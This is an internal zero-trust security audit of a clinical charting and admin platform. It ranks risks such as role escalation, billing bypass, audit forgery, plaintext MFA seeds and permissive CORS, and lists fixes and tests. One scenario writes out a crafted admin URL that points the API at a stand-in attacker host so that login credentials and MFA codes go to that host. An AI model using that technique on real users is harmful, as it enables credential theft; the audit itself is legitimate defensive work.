# Zero Trust Security Risk Audit

Status: P0 partial implementation in progress
Date: 2026-06-02
Scope: charting-web, charting-gateway, core-admin, platform-api
Cost profile: documentation only, no new GCP resources

## Purpose

This document reconciles two security reviews:

- the zero-trust review of SOAP/charting and Core Admin
- the follow-up residual-risk review for CORS, mobile pairing, proxy, cookie, cache, secret, CSRF, and user-facing error handling

The priority order is intentionally not limited to the residual-risk list. Some Core Admin and Platform API issues are more dangerous because they can directly escalate privileges, bypass billing, or corrupt audit evidence.

## Risk Rating

- Critical: can directly cause cross-organization takeover, billing bypass, or credential theft
- High: can materially weaken account security, audit integrity, or service availability
- Medium: exploitable only with a second condition, but should be fixed before customer use
- Low: defense-in-depth or hygiene issue

Priority:

- P0: fix before production customer onboarding
- P1: fix before handling real PHI at scale
- P2: hardening backlog; schedule after P0/P1

## P0 Risks

| # | Risk | Severity | Priority | Source |
|---|---|---:|---:|---|
| 1 | Core Admin can be pointed at an arbitrary Platform API by query string | Critical | P0 | Implemented |
| 2 | Organization admins can submit broad role changes without a strict assignable-role policy | Critical | P0 | Implemented |
| 3 | Product entitlement status can be changed through Core Admin/API instead of only Stripe/system workflows | Critical | P0 | Implemented |
| 4 | Audit events can be created from the admin API, so an admin session can forge audit evidence | High | P0 | Implemented |
| 5 | Platform MFA/TOTP secrets are stored as plain values | High | P0 | Code implemented; rollout pending |
| 6 | Platform API request bodies are read without a size limit | High | P0 | Implemented |

## Implementation Status

Implemented on 2026-06-02:

- Core Admin accepts the `platformApi` query override only on localhost-style development hosts.
- Core Admin no longer exposes product entitlement create/update controls.
- Platform API rejects browser/admin `POST` and `PATCH` writes to product entitlements.
- Platform API rejects browser/admin `POST` writes to audit events.
- Platform API blocks non-platform admins from assigning `platform_admin`.
- Platform API blocks self role escalation and last active org-admin removal.
- Platform API enforces a request body size limit before JSON parsing in the HTTP server.
- Platform API no longer trusts Netlify deploy-preview wildcard origins for credentialed CORS by default.
- Platform MFA enrollment now stores pending/enrolled TOTP seeds in encrypted fields and keeps legacy plaintext read compatibility.
- Runtime provisioning/deploy scripts now carry `APP_FIELD_ENCRYPTION_KEY` for Platform API as well as Charting Gateway.

Still pending:

- run the Platform API secret/deploy rollout so STG/PROD receive `APP_FIELD_ENCRYPTION_KEY`
- migrate, re-enroll, or naturally rotate any existing plaintext Platform MFA secrets
- continue P1 hardening for mobile pairing replay, charting proxy header allowlist, cookie deploy assertions, cache tests, CSRF timing-safe compare, and backend error shape

### 1. Core Admin API Endpoint Override

`core-admin` reads `platformApi` from the URL query string. This means a trusted URL can be crafted so that the login screen posts hospital code, login ID, password, and MFA code to an attacker-controlled endpoint.

Risk scenario:

1. Attacker sends `https://admin.halunasu.com/?platformApi=https://evil.example`.
2. User sees the real Halunasu admin UI.
3. Login credentials are submitted to the attacker endpoint.

Required fix:

- remove query-string API override in production
- allow only a compiled or environment-injected allowlist
- keep localhost override only for local development
- add a static test that production admin cannot read `platformApi` from `location.search`

### 2. Role Escalation Through Member Update

Member create/update accepts `globalRoles` and `productRoles`. The server must not trust the submitted role arrays as-is.

Required fix:

- define assignable roles by actor role
- `platform_admin` can be assigned only by an existing `platform_admin`
- org admins cannot assign platform-wide roles
- billing admins cannot grant clinical/admin roles
- prevent self-escalation
- prevent disabling or demoting the last usable org admin
- add tests for self-escalation, cross-role escalation, and last-admin lockout

### 3. Billing And Entitlement Bypass

Product entitlement records currently accept status and Stripe-related fields from the admin API. In the intended billing architecture, the hospital can buy, cancel, or manage billing, but it should not directly mark an app as paid/enabled.

Required fix:

- make `product_entitlements.status`, `stripeCustomerId`, `stripeSubscriptionId`, `stripeSubscriptionItemId`, `trialEndsAt`, and billing amounts system-owned
- allow hospital admins to initiate checkout, billing portal, or cancellation request only
- apply entitlement changes only from verified Stripe webhook or trusted internal job
- add tests proving a billing admin cannot set `charting` to `enabled` without system authority

### 4. Audit Event Forgery

Audit logs are evidence. If the admin API can create arbitrary audit events, an attacker with an admin session can create misleading entries and weaken incident investigation.

Required fix:

- remove public/admin `POST audit-events`
- create audit events inside the server action that performed the mutation
- use a separate internal-only interface if manual operational events are needed
- add tests proving user-controlled audit event creation is rejected

### 5. Plain MFA Secrets

TOTP secrets are high-value account recovery material. Firestore read access or a leaked service account should not reveal reusable authenticator seeds.

Required fix:

- encrypt pending and enrolled MFA secrets with a Secret Manager-backed field encryption key
- rotate or re-enroll existing secrets after implementing encryption
- ensure logs and audit payloads never include the secret or QR provisioning URI

### 6. Unbounded Request Body Read

The Platform API reads request bodies by concatenating stream chunks. Without a maximum size, unauthenticated or authenticated endpoints can be used for memory pressure and Cloud Run instance exhaustion.

Required fix:

- add a strict request body limit, for example 1 MB for normal JSON routes
- use explicit larger limits only where required
- reject oversized requests before JSON parsing
- add DoS-oriented tests for oversized signup/login/admin requests

## Reconciled Residual Risks

The following list incorporates the follow-up review. These issues are real, but they sit behind the P0 items above.

| # | Risk | Severity | Priority | Decision |
|---|---|---:|---:|---|
| 7 | Credentialed CORS allows Netlify preview wildcard | Medium | P1 | Keep only fixed production/STG hosts for credentialed CORS |
| 8 | Mobile pairing token is exposed through QR/URL fragment | Medium | P1 | Keep fragment cleanup, add short TTL, one-time use, and device binding verification |
| 9 | Charting proxy forwards broad client headers and client-derived forwarded headers | Medium | P1 | Replace with explicit header allowlist |
| 10 | Secure cookie behavior depends on runtime env configuration | Low-Medium | P1 | Enforce Secure outside local/test and verify deploy env |
| 11 | Operator context cache needs explicit separation proof | Low-Medium | P1 | Existing key includes org/login/member/tokenVersion/MFA; add tests and include roles or role version if needed |
| 12 | Default secret strings and conditional secret asserts | Low | P2 | Keep asserts strict and add regression tests for production-like boot |
| 13 | CSRF token comparison uses direct string comparison in charting middleware | Low | P2 | Use constant-time helper for consistency |
| 14 | Japanese-looking backend messages may pass through as user-facing UI text | Low | P2 | Keep backend/internal error separation; avoid echoing raw server messages |

### 7. Credentialed CORS Preview Wildcard

The Platform API currently allows fixed hosts, localhost, and `https://[name]--halunasu.netlify.app`, while also returning `access-control-allow-credentials: true`.

Problem:

- any Halunasu Netlify deploy preview can become a trusted credentialed origin
- a compromised preview could use a victim's browser session against Platform API

Required fix:

- remove the Netlify preview wildcard from production credentialed CORS
- keep production allowlist to fixed domains only, such as `admin.halunasu.com`, `charting.halunasu.com`, `fee.halunasu.com`, and `referral.halunasu.com`
- if preview testing is needed, use STG-only preview origins or a separate non-cookie auth path

### 8. Mobile Pairing Token QR/URL Exposure

The mobile pairing token is passed through a QR URL fragment. This avoids sending the token to the server as a URL path/query during page load and the client removes the token after reading it. The remaining risk is physical exposure: QR photo, shoulder surfing, browser history before cleanup, or shared screenshots.

Required fix:

- confirm token TTL is short
- confirm pairing token is one-time and invalidated immediately after claim
- bind the claimed stream token to the generated device ID
- audit failed and successful pairing claims without storing token values
- add tests for replay after successful claim

### 9. Charting Proxy Header Forwarding

`charting-web` proxies `/api/v1/*` to the gateway and currently forwards most client headers. It also sets `x-forwarded-host` and `x-forwarded-proto` from the incoming request URL.

Required fix:

- forward only approved headers: `cookie`, `content-type`, `x-csrf-token`, and explicit request IDs if needed
- never forward user-supplied `authorization` unless bearer auth is deliberately enabled and tested
- do not trust client-derived `x-forwarded-*` for authorization, rate limit keys, audit actor, or origin decisions
- assert the proxy target host is fixed by environment and not user-controlled

### 10. Secure Cookie Env Dependency

Platform cookies use `Secure` based on runtime options. This is acceptable only if production/STG deploys always set production-like env values.

Required fix:

- enforce `Secure` whenever `HALUNASU_ENV` is not local/test/development
- make deploy scripts fail if STG/PROD env is empty or local
- add a production-like cookie test for Platform and Charting

### 11. Operator Context Cache Separation

Charting gateway has a short-lived operator context cache. The current key includes organization code, login ID, member ID, token version, expiration, authentication methods, and MFA timestamp. That is directionally good, but it should be protected by regression tests because it sits on the authentication boundary.

Required fix:

- add tests proving contexts never cross org/member/login
- add tests proving tokenVersion invalidation bypasses cache
- consider including role version or current role hash if role updates become session-derived

### 12. Default Secrets And Conditional Asserts

Some config defaults use placeholder values such as `replace-me`, with startup assertions for the most important secrets. This is mostly guarded, but future secrets can regress.

Required fix:

- centralize required secret assertions
- make production-like boot fail for any placeholder secret
- add security-boundary tests that scan runtime config for placeholder defaults

### 13. CSRF Constant-Time Compare

Charting middleware compares CSRF cookie/header values with direct string comparison. This is low risk because the CSRF token is not a password-equivalent secret, but constant-time comparison is simple and consistent with existing signature verification helpers.

Required fix:

- replace direct CSRF string comparison with the existing timing-safe helper
- keep the same user-facing error response

### 14. User-Facing Japanese Error Passthrough

The frontend intentionally passes through Japanese-looking backend messages. This improves UX, but it means backend developers must never return internal Japanese error details as public response messages.

Required fix:

- keep backend internal errors and user-facing messages separate
- define `userMessage` / `errorCode` response shape
- keep raw exception messages in server logs only
- add tests for representative internal Japanese errors

## Positive Controls Already Present

These controls reduce risk and should be preserved:

- Charting session operations perform object-level checks before reading or mutating encounters.
- Charting no longer relies on localStorage bearer tokens for normal browser auth.
- Platform session cookies are signed and HttpOnly.
- Platform session validation checks login identity status, member status, and token version.
- Mutating Platform routes use CSRF checks.
- Charting pairing token is passed in URL fragment and removed from the URL after hydration.
- Charting gateway asserts the main pairing/session signing secrets at startup.

## Implementation Order

1. Remove Core Admin `platformApi` query override in production and add regression test.
2. Add Platform role assignment policy and last-admin/self-escalation tests.
3. Lock product entitlement status and Stripe fields to Stripe webhook/system-only updates.
4. Remove or internalize arbitrary audit-event creation.
5. Encrypt Platform MFA secrets and define migration/re-enrollment path.
6. Add Platform body size limit.
7. Tighten Platform CORS to fixed credentialed origins.
8. Harden mobile pairing TTL, one-time use, replay tests, and device binding tests.
9. Replace charting proxy header forwarding with an allowlist.
10. Add secure-cookie deploy assertions and production-like tests.
11. Add operator context cache separation tests.
12. Add default-secret, CSRF compare, and user-facing-error hardening tests.

## Acceptance Criteria

- P0 tests fail before the fix and pass after the fix.
- No hospital-scoped admin can grant platform-wide roles.
- No hospital-scoped admin can mark an app paid/enabled without system authority.
- Audit events are server-generated or internal-only.
- TOTP secrets are encrypted at rest.
- Oversized Platform API request bodies are rejected.
- PROD credentialed CORS contains no wildcard Netlify preview origin.
- Mobile pairing token replay after claim is rejected.
- Charting proxy forwards only allowlisted headers.
- Production-like cookie tests prove `Secure` is set.
